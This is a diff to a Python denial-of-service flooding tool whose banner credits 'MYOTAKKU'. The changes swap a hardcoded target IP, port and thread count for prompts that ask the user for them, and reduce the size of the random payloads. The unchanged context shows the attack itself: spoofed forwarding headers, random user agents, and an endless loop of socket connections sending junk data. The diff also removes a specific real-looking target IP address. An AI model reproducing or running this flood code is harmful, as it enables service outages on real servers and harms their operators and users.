@@ -2379,11 +2379,11 @@ print("")
 print("[+] Tools V4 Created By MYOTAKKU")
 print("[-] TOOLS DDOS BY MYOTAKKU GANTENG SEJAGAT RAYA")
 print("------------------------------------------------")
-ip = str("145.239.149.135")
-port = int("80")
+ip = str(input(" IP/DOMAIN: "))
+port = int(input(" PORT: "))
 method = str("TCP")
 times = int("500")
-threads = int("50000")
+threads = int(input(" THREADS: "))
 time.sleep(1)
 print("[0] Checking IP ..........")
 print("Attack Send TO " + ip)
@@ -2457,9 +2457,9 @@ def ddos():
             random.randint(0, 255)) + "\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
     request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
-    data = random._urandom(10999)
-    data1 = random._urandom(10899)
-    data2 = random._urandom(10199)
+    data = random._urandom(1099)
+    data1 = random._urandom(1089)
+    data2 = random._urandom(1019)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
